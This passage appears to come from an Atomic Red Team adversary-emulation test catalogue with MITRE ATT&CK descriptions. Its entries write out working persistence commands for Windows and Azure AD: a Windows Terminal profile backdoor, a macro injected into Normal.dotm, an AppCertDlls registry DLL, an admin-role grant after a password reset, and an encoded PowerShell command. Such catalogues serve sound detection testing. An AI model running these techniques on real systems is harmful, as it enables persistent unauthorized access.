    https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html

    '
  get_prereq_command: ''
  input_arguments: {}
  mitre_info:
    mitre_data_sources: *id015
    mitre_defensive_measures: []
    mitre_description: "Adversaries may establish persistence and/or elevate privileges\
      \ by executing malicious content triggered by application shims. The Microsoft\
      \ Windows Application Compatibility Infrastructure/Framework (Application Shim)\
      \ was created to allow for backward compatibility of software as the operating\
      \ system codebase changes over time. For example, the application shimming feature\
      \ allows developers to apply fixes to applications (without rewriting code)\
      \ that were created for Windows XP so that it will work with Windows 10. (Citation:\
      \ Elastic Process Injection July 2017)\n\nWithin the framework, shims are created\
      \ to act as a buffer between the program (or more specifically, the Import Address\
      \ Table) and the Windows OS. When a program is executed, the shim cache is referenced\
      \ to determine if the program requires the use of the shim database (.sdb).\
      \ If so, the shim database uses hooking to redirect the code as necessary in\
      \ order to communicate with the OS. \n\nA list of all shims currently installed\
      \ by the default Windows installer (sdbinst.exe) is kept in:\n\n* <code>%WINDIR%\\\
      AppPatch\\sysmain.sdb</code> and\n* <code>hklm\\software\\microsoft\\windows\
      \ nt\\currentversion\\appcompatflags\\installedsdb</code>\n\nCustom databases\
      \ are stored in:\n\n* <code>%WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\\
      AppPatch64\\Custom</code> and\n* <code>hklm\\software\\microsoft\\windows nt\\\
      currentversion\\appcompatflags\\custom</code>\n\nTo keep shims secure, Windows\
      \ designed them to run in user mode so they cannot modify the kernel and you\
      \ must have administrator privileges to install a shim. However, certain shims\
      \ can be used to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)\
      \ (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data\
      \ Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH),\
      \ and intercept memory addresses (GetProcAddress).\n\nUtilizing these shims\
      \ may allow an adversary to perform several malicious acts such as elevate privileges,\
      \ install backdoors, disable defenses like Windows Defender, etc. (Citation:\
      \ FireEye Application Shimming) Shims can also be abused to establish persistence\
      \ by continuously being invoked by affected programs."
    mitre_examples: []
    mitre_id: T1546.011
    mitre_mitigations: []
    mitre_name: Application Shimming
    mitre_platforms: *id016
    mitre_references:
    - https://attack.mitre.org/techniques/T1546/011
    - https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process
    - http://files.brucon.org/2015/Tomczak_and_Ballenthin_Shims_for_the_Win.pdf
    - https://www.blackhat.com/docs/eu-15/materials/eu-15-Pierce-Defending-Against-Malicious-Application-Compatibility-Shims-wp.pdf
    mitre_related_techniques: []
  name: Registry key creation and/or modification events for SDB
  platforms:
  - windows
  prereq_command: ''
  references: []
- atomic_id: ec5d76ef-82fe-48da-b931-bdb25a62bc65
  cleanup_command: 'mv -Force #{settings_json_tmp} #{settings_json_def}

    taskkill /F /IM "#{calculator}" > $null

    '
  command: 'mv #{settings_json_def} #{settings_json_tmp}

    Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.015/src/settings.json?raw=true"
    -OutFile "#{settings_json_def}"

    wt.exe

    '
  description: Modify Windows Terminal settings.json file to gain persistence. [Twitter
    Post](https://twitter.com/nas_bench/status/1550836225652686848)
  get_prereq_command: '$(rm ~\AppData\Local\Packages\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\LocalState\StoreEdgeFD\installed.db
    -ErrorAction Ignore; Write-Output ""; $?) -and $(winget install --id=Microsoft.WindowsTerminal)

    '
  input_arguments:
    calculator:
      default: calculator.exe
      description: Test program used to imitate a maliciously called program.
      type: string
    settings_json_def:
      default: ~\AppData\Local\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\settings.json
      description: Default file for Windows Terminal to replace the default profile
        with a backdoor to call another program.
      type: path
    settings_json_tmp:
      default: ~\AppData\Local\Temp\settings.json
      description: Temp file for Windows Terminal.
      type: path
    wt_exe:
      default: ~\AppData\Local\Microsoft\WindowsApps\Microsoft.WindowsTerminal_8wekyb3d8bbwe\wt.exe
      description: Windows Terminal executable.
      type: path
  mitre_info:
    mitre_data_sources:
    - 'Process: Process Creation'
    - 'File: File Creation'
    - 'File: File Modification'
    mitre_defensive_measures: []
    mitre_description: "Adversaries may add login items to execute upon user login\
      \ to gain persistence or escalate privileges. Login items are applications,\
      \ documents, folders, or server connections that are automatically launched\
      \ when a user logs in.(Citation: Open Login Items Apple) Login items can be\
      \ added via a shared file list or Service Management Framework.(Citation: Adding\
      \ Login Items) Shared file list login items can be set using scripting languages\
      \ such as [AppleScript](https://attack.mitre.org/techniques/T1059/002), whereas\
      \ the Service Management Framework uses the API call <code>SMLoginItemSetEnabled</code>.\n\
      \nLogin items installed using the Service Management Framework leverage <code>launchd</code>,\
      \ are not visible in the System Preferences, and can only be removed by the\
      \ application that created them.(Citation: Adding Login Items)(Citation: SMLoginItemSetEnabled\
      \ Schroeder 2013) Login items created using a shared file list are visible in\
      \ System Preferences, can hide the application when it launches, and are executed\
      \ through LaunchServices, not launchd, to open applications, documents, or URLs\
      \ without using Finder.(Citation: Launch Services Apple Developer) Users and\
      \ applications use login items to configure their user environment to launch\
      \ commonly used services or applications, such as email, chat, and music applications.\n\
      \nAdversaries can utilize [AppleScript](https://attack.mitre.org/techniques/T1059/002)\
      \ and [Native API](https://attack.mitre.org/techniques/T1106) calls to create\
      \ a login item to spawn malicious executables.(Citation: ELC Running at startup)\
      \ Prior to version 10.5 on macOS, adversaries can add login items by using [AppleScript](https://attack.mitre.org/techniques/T1059/002)\
      \ to send an Apple events to the \u201CSystem Events\u201D process, which has\
      \ an AppleScript dictionary for manipulating login items.(Citation: Login Items\
      \ AE) Adversaries can use a command such as <code>tell application \u201CSystem\
      \ Events\u201D to make login item at end with properties /path/to/executable</code>.(Citation:\
      \ Startup Items Eclectic)(Citation: hexed osx.dok analysis 2019)(Citation: Add\
      \ List Remove Login Items Apple Script) This command adds the path of the malicious\
      \ executable to the login item file list located in <code>~/Library/Application\
      \ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm</code>.(Citation:\
      \ Startup Items Eclectic) Adversaries can also use login items to launch executables\
      \ that can be used to control the victim system remotely or as a means to gain\
      \ privilege escalation by prompting for user credentials.(Citation: objsee mac\
      \ malware 2017)(Citation: CheckPoint Dok)(Citation: objsee netwire backdoor\
      \ 2019)"
    mitre_examples: []
    mitre_id: T1547.015
    mitre_mitigations: []
    mitre_name: Login Items
    mitre_platforms:
    - macOS
    mitre_references:
    - https://attack.mitre.org/techniques/T1547/015
    - https://support.apple.com/guide/mac-help/open-items-automatically-when-you-log-in-mh15189/mac
    - https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLoginItems.html
    - https://blog.timschroeder.net/2013/04/21/smloginitemsetenabled-demystified/
    - https://developer.apple.com/documentation/coreservices/launch_services
    - https://eclecticlight.co/2018/05/22/running-at-startup-when-to-use-a-login-item-or-a-launchagent-launchdaemon/
    - https://developer.apple.com/library/archive/samplecode/LoginItemsAE/Introduction/Intro.html#//apple_ref/doc/uid/DTS10003788
    - https://eclecticlight.co/2021/09/16/how-to-run-an-app-or-tool-at-startup/
    - http://www.hexed.in/2019/07/osxdok-analysis.html
    - https://gist.github.com/kaloprominat/6111584
    - https://objective-see.com/blog/blog_0x25.html
    - https://blog.checkpoint.com/2017/04/27/osx-malware-catching-wants-read-https-traffic/
    - https://objective-see.com/blog/blog_0x44.html
    - https://objective-see.com/blog/blog_0x31.html
    - https://www.sentinelone.com/blog/how-malware-persists-on-macos/
    - https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Articles/LaunchServicesKeys.html#//apple_ref/doc/uid/TP40009250-SW1
    mitre_related_techniques: []
  name: Persistence by modifying Windows Terminal profile
  platforms:
  - windows
  prereq_command: 'if (Test-Path #{wt_exe}) {exit 0} else {exit 1}

    '
  references: []
- atomic_id: 940db09e-80b6-4dd0-8d4d-7764f89b47a8
  cleanup_command: "# Registry setting to \"Trust access to the VBA project object\
    \ model\" in Word\n$registryKey = \"HKCU:Software\\Microsoft\\Office\\16.0\\Word\\\
    Security\"\n$registryValue = \"AccessVBOM\"\n$registryData1 = \"1\"\n$registryData0\
    \ = \"0\"\n# Defines the path each flag file created depending on the original\
    \ registry state\n$flagPath1 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\\
    Templates\\T1137-001_Flag1.txt\"\n$flagPath2 = \"$env:USERPROFILE\\AppData\\Roaming\\\
    Microsoft\\Templates\\T1137-001_Flag2.txt\"\n# Define the path of copied normal\
    \ template for restoral\n$copyPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\\
    Templates\\Normal1.dotm\"\n# Define the path to the normal template\n$docPath\
    \ = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm\"\n\
    # Delete the scheduled task created by the Macro\nschtasks /Delete /TN \"OpenCalcTask\"\
    \ /F | Out-Null\n#Restore the orginal template if the backup copy exists\nif (Test-Path\
    \ $copyPath)\n{\n  #Delete the injected template\n  Remove-Item -Force $docPath\
    \ -ErrorAction SilentlyContinue\n  # Restore the original template\n  Rename-Item\
    \ -Force -Path $copyPath -NewName $docPath -ErrorAction SilentlyContinue\n  Write-Host\
    \ \"The original template has been restored\"\n}\n  else\n{\n  Write-Host \"The\
    \ original template is present\"\n}\n#Restore the original state of the registry\
    \ key\nif (Test-Path $flagPath1) \n{\n  # The value was originally 0, set back\
    \ to 0\n  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData0\
    \ -PropertyType DWORD -Force | Out-Null\n  Remove-Item -Force $flagPath1 -ErrorAction\
    \ SilentlyContinue\n  Write-Host \"The original registry state has been restored\"\
    \n} \n  elseif (Test-Path $flagPath2)\n{\n  #The value did not previously exist,\
    \ delete the value\n  Remove-ItemProperty -Path $registryKey -Name $registryValue\
    \ | Out-Null\n  Remove-Item -Force $flagPath2 -ErrorAction SilentlyContinue |\
    \ Out-Null\n  Write-Host \"The original registry state has been restored\"\n}\n\
    \  else \n{\n  # The value was already 1, do nothing\n  Write-Host \"The value\
    \ $registryValue already existed in $registryKey.\"\n}\n"
  command: "# Registry setting to \"Trust access to the VBA project object model\"\
    \ in Word\n$registryKey = \"HKCU:Software\\Microsoft\\Office\\16.0\\Word\\Security\"\
    \n$registryValue = \"AccessVBOM\"\n$registryData = \"1\"\n# The path where a flag\
    \ text file will be created if Registry setting did not already exist or if it\
    \ was set to 0\n$flagPath1 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\\
    Templates\\T1137-001_Flag1.txt\"\n$flagPath2 = \"$env:USERPROFILE\\AppData\\Roaming\\\
    Microsoft\\Templates\\T1137-001_Flag2.txt\"\n# Get the value of the Key/Value\
    \ pair\n$value = (Get-ItemProperty -Path $registryKey -Name $registryValue -ErrorAction\
    \ SilentlyContinue).$registryValue\n# Logical operation to: if the value of the\
    \ key/value is 1, do nothing - \n# if the value is 0, change it to 1 and create\
    \ flag1 - \n# if it doesn't exist, create the value and flag2\nif ($value -eq\
    \ \"1\") \n{\n  Write-Host \"The registry value '$registryValue' already exists\
    \ with the required setting.\"\n}   \n  elseif ($value -eq \"0\") \n{\n  Write-Host\
    \ \"The registry value was set to 0, temporarily changing to 1.\"\n  New-ItemProperty\
    \ -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD\
    \ -Force | Out-Null\n  echo \"flag1\" > $flagPath1\n} \n  else \n{\n  Write-Host\
    \ \"The registry value '$registryValue' does not exist, temporarily creating it.\"\
    \n  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData\
    \ -PropertyType DWORD -Force | Out-Null\n  echo \"flag2\" > $flagPath2\n}\nAdd-Type\
    \ -AssemblyName Microsoft.Office.Interop.Word\n# Define the path of copied normal\
    \ template for restoral\n$copyPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\\
    Templates\\Normal1.dotm\"\n# Define the path to the normal template\n$docPath\
    \ = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm\"\n\
    # Create copy of orginal template for restoral\nCopy-Item -Path $docPath -Destination\
    \ $copyPath -Force\n# VBA code to be insterted as a Macro\n# Will create a scheduled\
    \ task to open the Calculator at 8:04pm daily\n$vbaCode = @\"\n  Sub AutoExec()\n\
    \  Dim applicationPath As String\n  Dim taskName As String\n  Dim runTime As String\n\
    \  Dim schTasksCmd As String\n  applicationPath = \"C:\\Windows\\System32\\calc.exe\"\
    \n  taskName = \"OpenCalcTask\"\n  runTime = \"20:04\"\n  schTasksCmd = \"schtasks\
    \ /create /tn \"\"\" & taskName & \"\"\" /tr \"\"\" & applicationPath & \"\"\"\
    \ /sc daily /st \" & runTime & \" /f\"\n  Shell \"cmd.exe /c \" & schTasksCmd,\
    \ vbNormalFocus\n  End Sub\n\"@\n# Create a new instance of Word.Application\n\
    $word = New-Object -ComObject Word.Application\n# Keep the Word application hidden\n\
    $word.Visible = $false\n# Open the document\n$document = $word.Documents.Open($docPath)\n\
    # Access the VBA project of the document\n$vbaProject = $document.VBProject\n\
    # Add a new module to the VBA project\n$newModule = $vbaProject.VBComponents.Add(1)\
    \ # 1 = vbext_ct_StdModule\n# Add the VBA code to the new module\n$newModule.CodeModule.AddFromString($vbaCode)\n\
    # Run the Macro\n$word.run(\"AutoExec\")\n# Save and close the document\n$document.SaveAs($docPath)\n\
    $document.Close()\n# Quit Word\n$word.Quit()\n# Release COM objects\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($document)\
    \ | Out-Null\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($word)\
    \ | Out-Null\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($vbaProject)\
    \ | Out-Null\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($newModule)\
    \ | Out-Null\n"
  description: 'Injects a Macro in the Word default template "Normal.dotm" and makes
    it execute each time that Word is opened. In this test, the Macro creates a sheduled
    task to open Calc.exe every evening.

    '
  get_prereq_command: 'Write-Host "You will need to install Microsoft Word manually
    to meet this requirement"

    '
  input_arguments: {}
  mitre_info:
    mitre_data_sources:
    - 'File: File Creation'
    - 'Windows Registry: Windows Registry Key Modification'
    - 'Command: Command Execution'
    - 'Process: Process Creation'
    - 'Windows Registry: Windows Registry Key Creation'
    - 'File: File Modification'
    mitre_defensive_measures: []
    mitre_description: "Adversaries may abuse Microsoft Office templates to obtain\
      \ persistence on a compromised system. Microsoft Office contains templates that\
      \ are part of common Office applications and are used to customize styles. The\
      \ base templates within the application are used each time an application starts.\
      \ (Citation: Microsoft Change Normal Template)\n\nOffice Visual Basic for Applications\
      \ (VBA) macros (Citation: MSDN VBA in Office) can be inserted into the base\
      \ template and used to execute code when the respective Office application starts\
      \ in order to obtain persistence. Examples for both Word and Excel have been\
      \ discovered and published. By default, Word has a Normal.dotm template created\
      \ that can be modified to include a malicious macro. Excel does not have a template\
      \ file created by default, but one can be added that will automatically be loaded.(Citation:\
      \ enigma0x3 normal.dotm)(Citation: Hexacorn Office Template Macros) Shared templates\
      \ may also be stored and pulled from remote locations.(Citation: GlobalDotName\
      \ Jun 2019) \n\nWord Normal.dotm location:<br>\n<code>C:\\Users\\&lt;username&gt;\\\
      AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm</code>\n\nExcel Personal.xlsb\
      \ location:<br>\n<code>C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Microsoft\\\
      Excel\\XLSTART\\PERSONAL.XLSB</code>\n\nAdversaries may also change the location\
      \ of the base template to point to their own by hijacking the application's\
      \ search order, e.g. Word 2016 will first look for Normal.dotm under <code>C:\\\
      Program Files (x86)\\Microsoft Office\\root\\Office16\\</code>, or by modifying\
      \ the GlobalDotName registry key. By modifying the GlobalDotName registry key\
      \ an adversary can specify an arbitrary location, file name, and file extension\
      \ to use for the template that will be loaded on application startup. To abuse\
      \ GlobalDotName, adversaries may first need to register the template as a trusted\
      \ document or place it in a trusted location.(Citation: GlobalDotName Jun 2019)\
      \ \n\nAn adversary may need to enable macros to execute unrestricted depending\
      \ on the system or enterprise security policy on use of macros."
    mitre_examples: []
    mitre_id: T1137.001
    mitre_mitigations: []
    mitre_name: Office Template Macros
    mitre_platforms:
    - Windows
    - Office Suite
    mitre_references:
    - https://attack.mitre.org/techniques/T1137/001
    - https://msdn.microsoft.com/en-us/vba/office-shared-vba/articles/getting-started-with-vba-in-office
    - http://www.hexacorn.com/blog/2017/04/19/beyond-good-ol-run-key-part-62/
    - https://support.office.com/article/Change-the-Normal-template-Normal-dotm-06de294b-d216-47f6-ab77-ccb5166f98ea
    - https://enigma0x3.net/2014/01/23/maintaining-access-with-normal-dotm/comment-page-1/
    - https://malware.news/t/using-outlook-forms-for-lateral-movement-and-persistence/13746
    - https://www.221bluestreet.com/post/office-templates-and-globaldotname-a-stealthy-office-persistence-technique
    - https://medium.com/@bwtech789/outlook-today-homepage-persistence-33ea9b505943
    mitre_related_techniques: []
  name: Injecting a Macro into the Word Normal.dotm Template for Persistence via PowerShell
  platforms:
  - windows
  prereq_command: "try {\n  New-Object -COMObject \"Word.Application\" | Out-Null\n\
    \  Stop-Process -Name \"winword\"\n  exit 0\n} catch { exit 1 }\n"
  references: []
- atomic_id: b8a49f03-e3c4-40f2-b7bb-9e8f8fdddbf1
  cleanup_command: "echo \"Removing %systemroot%\\wpbbin.exe\" \nRemove-Item -Path\
    \ \"$env:SystemRoot\\System32\\wpbbin.exe\"\n"
  command: "echo \"Creating %systemroot%\\wpbbin.exe\"      \nNew-Item -ItemType File\
    \ -Path \"$env:SystemRoot\\System32\\wpbbin.exe\"\n"
  description: 'Creates Wpbbin.exe in %systemroot%. This technique can be used for
    UEFI-based pre-OS boot persistence mechanisms.

    - https://grzegorztworek.medium.com/using-uefi-to-inject-executable-files-into-bitlocker-protected-drives-8ff4ca59c94c

    - http://download.microsoft.com/download/8/a/2/8a2fb72d-9b96-4e2d-a559-4a27cf905a80/windows-platform-binary-table.docx

    - https://github.com/tandasat/WPBT-Builder

    '
  get_prereq_command: ''
  input_arguments: {}
  mitre_info:
    mitre_data_sources:
    - 'Firmware: Firmware Modification'
    mitre_defensive_measures: []
    mitre_description: 'Adversaries may modify system firmware to persist on systems.The
      BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface
      (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware
      that operate as the software interface between the operating system and hardware
      of a computer.(Citation: Wikipedia BIOS)(Citation: Wikipedia UEFI)(Citation:
      About UEFI)


      System firmware like BIOS and (U)EFI underly the functionality of a computer
      and may be modified by an adversary to perform or assist in malicious activity.
      Capabilities exist to overwrite the system firmware, which may give sophisticated
      adversaries a means to install malicious firmware updates as a means of persistence
      on a system that may be difficult to detect.'
    mitre_examples: []
    mitre_id: T1542.001
    mitre_mitigations: []
    mitre_name: System Firmware
    mitre_platforms:
    - Windows
    - Network
    mitre_references:
    - https://attack.mitre.org/techniques/T1542/001
    - https://securingtomorrow.mcafee.com/business/chipsec-support-vault-7-disclosure-scanning/
    - http://www.mitre.org/capabilities/cybersecurity/overview/cybersecurity-blog/copernicus-question-your-assumptions-about
    - http://www.intelsecurity.com/advanced-threat-research/content/data/HT-UEFI-rootkit.html
    - https://github.com/chipsec/chipsec
    - http://www.uefi.org/about
    - http://www.mitre.org/publications/project-stories/going-deep-into-the-bios-with-mitre-firmware-security-research
    - https://en.wikipedia.org/wiki/Unified_Extensible_Firmware_Interface
    - https://en.wikipedia.org/wiki/BIOS
    mitre_related_techniques: []
  name: UEFI Persistence via Wpbbin.exe File Creation
  platforms:
  - windows
  prereq_command: ''
  references: []
- atomic_id: 14f3af20-61f1-45b8-ad31-4637815f3f44
  cleanup_command: 'Import-Module MSOnline

    $password = ConvertTo-SecureString -String "#{auth_password}" -AsPlainText -Force

    $credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList
    "#{auth_username}", $password

    Connect-MsolService -Credential $credential

    Remove-MsolRoleMember -RoleName "Company Administrator" -RoleMemberType User -RoleMemberEmailAddress
    "#{target_user}"

    Remove-MsolRoleMember -RoleName "Global Reader" -RoleMemberType User -RoleMemberEmailAddress
    "#{target_user}"

    '
  command: 'Import-Module MSOnline

    Import-Module AzureAD

    $password = ConvertTo-SecureString -String "#{auth_password}" -AsPlainText -Force

    $credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList
    "#{auth_username}", $password

    $targetsecurepw = ConvertTo-SecureString -String "#{target_password}" -AsPlainText
    -Force

    Connect-MsolService -Credential $credential -ErrorAction:SilentlyContinue

    Connect-AzureAD -Credential $credential -ErrorAction:SilentlyContinue


    #Saving the ObjectId of the target_user into a variable

    $target_objid = Get-AzureADUser -filter "userPrincipalName eq ''#{target_user}''"
    | Select-Object -ExpandProperty ObjectId


    #Reset the password of the target_user

    Set-AzureADUserPassword -ObjectId  $target_objid -Password $targetsecurepw -ErrorAction:SilentlyContinue


    #Adding target_user

    Add-MsolRoleMember -RoleName "Company Administrator" -RoleMemberEmailAddress "#{target_user}"

    Add-MsolRoleMember -RoleName "Global Reader" -RoleMemberEmailAddress "#{target_user}"

    '
  description: "This test looks at simulating the an adversary described in the following\
    \ blog post. It involves resetting the password of a normal user and adding to\
    \ the company administrator role within M365.\n Reference: https://www.huntress.com/blog/business-email-compromise-via-azure-administrative-privileges\n"
  get_prereq_command: 'Install-Module -Name MSOnline -Scope CurrentUser -Force

    Install-Module -Name AzureAD -Scope CurrentUser -Force

    '
  input_arguments:
    auth_password:
      default: p4sswd
      description: Azure AD password for user auth_username
      type: string
    auth_username:
      default: jonh@contoso.com
      description: Azure AD username used to conduct the adversary activity
      type: string
    target_password:
      default: Ohn05GeMe#$
      description: The password that the user target_user will be reset to.
      type: string
    target_user:
      default: default
      description: Name of the user whose password be reset and added to the admin
        role.
      type: string
  mitre_info:
    mitre_data_sources:
    - 'User Account: User Account Modification'
    mitre_defensive_measures: []
    mitre_description: "An adversary may add additional roles or permissions to an\
      \ adversary-controlled cloud account to maintain persistent access to a tenant.\
      \ For example, adversaries may update IAM policies in cloud-based environments\
      \ or add a new global administrator in Office 365 environments.(Citation: AWS\
      \ IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation:\
      \ Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft\
      \ O365 Admin Roles) With sufficient permissions, a compromised account can gain\
      \ almost unlimited access to data and settings (including the ability to reset\
      \ the passwords of other admins).(Citation: Expel AWS Attacker)\n(Citation:\
      \ Microsoft O365 Admin Roles) \n\nThis account modification may immediately\
      \ follow [Create Account](https://attack.mitre.org/techniques/T1136) or other\
      \ malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078)\
      \ that they have compromised. This could lead to privilege escalation, particularly\
      \ if the roles added allow for lateral movement to additional accounts.\n\n\
      For example, in AWS environments, an adversary with appropriate permissions\
      \ may be able to use the <code>CreatePolicyVersion</code> API to define a new\
      \ version of an IAM policy or the <code>AttachUserPolicy</code> API to attach\
      \ an IAM policy with additional or distinct permissions to a compromised user\
      \ account.(Citation: Rhino Security Labs AWS Privilege Escalation)\n\nIn some\
      \ cases, adversaries may add roles to adversary-controlled accounts outside\
      \ the victim cloud tenant. This allows these external accounts to perform actions\
      \ inside the victim tenant without requiring the adversary to [Create Account](https://attack.mitre.org/techniques/T1136)\
      \ or modify a victim-owned account.(Citation: Invictus IR DangerDev 2024)"
    mitre_examples: []
    mitre_id: T1098.003
    mitre_mitigations: []
    mitre_name: Additional Cloud Roles
    mitre_platforms:
    - IaaS
    - SaaS
    - Office Suite
    - Identity Provider
    mitre_references:
    - https://attack.mitre.org/techniques/T1098/003
    - https://expel.com/blog/incident-report-from-cli-to-console-chasing-an-attacker-in-aws/
    - https://docs.microsoft.com/en-us/office365/admin/add-users/about-admin-roles?view=o365-worldwide
    - https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies.html
    - https://cloud.google.com/iam/docs/policies
    - https://www.invictus-ir.com/news/the-curious-case-of-dangerdev-protonmail-me
    - https://support.office.com/en-us/article/add-another-admin-f693489f-9f55-4bd0-a637-a81ce93de22d
    - https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
    mitre_related_techniques: []
  name: Simulate - Post BEC persistence via user password reset followed by user added
    to company administrator role
  platforms:
  - azure-ad
  prereq_command: "$required_mods = 'AzureAD', 'MSOnline'\n$installed_mods = @((Get-Module\
    \ $required_mods -ListAvailable -ErrorAction SilentlyContinue).Name  | Select-Object\
    \ -Unique)\n$notInstalled = Compare-Object $required_mods $installed_mods -PassThru\
    \ -ErrorAction SilentlyContinue\n\nif ($notInstalled) {\n# Prompt for installing\
    \ the missing ones.\nWrite-Output \"The following PS modules aren't currently\
    \ installed:\"\n$notInstalled\n  exit 1\n}\n\n else{\n  Write-Output \"All required\
    \ PS modules are installed\"\n  exit 0\n }\n"
  references: []
- atomic_id: a5ad6104-5bab-4c43-b295-b4c44c7c6b05
  cleanup_command: 'reg delete "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session
    Manager\AppCertDlls" /v "AtomicTest" /f

    Remove-Item C:\Users\Public\AtomicTest.dll -Force

    Remove-Item C:\Users\Public\AtomicTest.txt -Force

    '
  command: "Copy-Item \"#{dll_path}\" C:\\Users\\Public\\AtomicTest.dll -Force\nreg\
    \ add \"HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\\
    AppCertDlls\" /v \"AtomicTest\" /t REG_EXPAND_SZ /d \"C:\\Users\\Public\\AtomicTest.dll\"\
    \ /f\nif(#{reboot}){Restart-Computer} \n"
  description: "Creates a new 'AtomicTest' value pointing to an AppCert DLL in the\
    \ AppCertDlls registry key. \nOnce the computer restarted, the DLL will be loaded\
    \ in multiple processes and write an \n'AtomicTest.txt' file in C:\\Users\\Public\\\
    \ to validate that the DLL executed succesfully.\n\nReference: https://skanthak.homepage.t-online.de/appcert.html\n"
  get_prereq_command: 'New-Item -Type Directory (split-path "#{dll_path}") -ErrorAction
    ignore | Out-Null

    Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.009/bin/AtomicTest.dll"
    -OutFile "#{dll_path}"

    '
  input_arguments:
    dll_path:
      default: PathToAtomicsFolder\T1546.009\bin\AtomicTest.dll
      description: path of dll to use
      type: path
    reboot:
      default: $false
      description: Set value to $true if you want to automatically reboot the machine
      type: string
  mitre_info:
    mitre_data_sources:
    - 'Module: Module Load'
    - 'Command: Command Execution'
    - 'Process: OS API Execution'
    - 'Windows Registry: Windows Registry Key Modification'
    - 'Process: Process Creation'
    mitre_defensive_measures: []
    mitre_description: 'Adversaries may establish persistence and/or elevate privileges
      by executing malicious content triggered by AppCert DLLs loaded into processes.
      Dynamic-link libraries (DLLs) that are specified in the <code>AppCertDLLs</code>
      Registry key under <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session
      Manager\</code> are loaded into every process that calls the ubiquitously used
      application programming interface (API) functions <code>CreateProcess</code>,
      <code>CreateProcessAsUser</code>, <code>CreateProcessWithLoginW</code>, <code>CreateProcessWithTokenW</code>,
      or <code>WinExec</code>. (Citation: Elastic Process Injection July 2017)


      Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), this
      value can be abused to obtain elevated privileges by causing a malicious DLL
      to be loaded and run in the context of separate processes on the computer. Malicious
      AppCert DLLs may also provide persistence by continuously being triggered by
      API activity. '
    mitre_examples: []
    mitre_id: T1546.009
    mitre_mitigations: []
    mitre_name: AppCert DLLs
    mitre_platforms:
    - Windows
    mitre_references:
    - https://attack.mitre.org/techniques/T1546/009
    - https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process
    - https://technet.microsoft.com/en-us/sysinternals/bb963902
    - https://forum.sysinternals.com/appcertdlls_topic12546.html
    mitre_related_techniques: []
  name: Create registry persistence via AppCert DLL
  platforms:
  - windows
  prereq_command: 'if (Test-Path "#{dll_path}") {exit 0} else {exit 1}

    '
  references: []
- atomic_id: 7db7a7f9-9531-4840-9b30-46220135441c
  cleanup_command: ''
  command: 'powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA

    '
  description: "Solarigate persistence is achieved via backdoors deployed via various\
    \ techniques including using PowerShell with an EncodedCommand\n Powershell -nop\
    \ -exec bypass -EncodedCommand <encoded command>\nWhere the \u2013EncodedCommand,\
    \ once decoded, would resemble:\n  Invoke-WMIMethod win32_process -name create\
    \ -argumentlist \u2018rundll32 c:\\windows\\idmu\\common\\ypprop.dll _XInitImageFuncPtrs\u2019\
    \ -ComputerName WORKSTATION\nThe EncodedCommand in this atomic is the following:\
    \ Invoke-WmiMethod -Path win32_process -Name create -ArgumentList notepad.exe\n\
    You should expect to see notepad.exe running after execution of this test.\n[Solarigate\
    \ Analysis from Microsoft](https://www.microsoft.com/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack-and-how-microsoft-defender-helps-protect/)\n"
  get_prereq_command: ''
  input_arguments: {}
  mitre_info:
    mitre_data_sources:
    - 'Network Traffic: Network Connection Creation'
    - 'Process: Process Creation'
    - 'WMI: WMI Creation'
    - 'Command: Command Execution'
    mitre_defensive_measures: []
    mitre_description: "Adversaries may abuse Windows Management Instrumentation (WMI)\
      \ to execute malicious commands and payloads. WMI is designed for programmers\
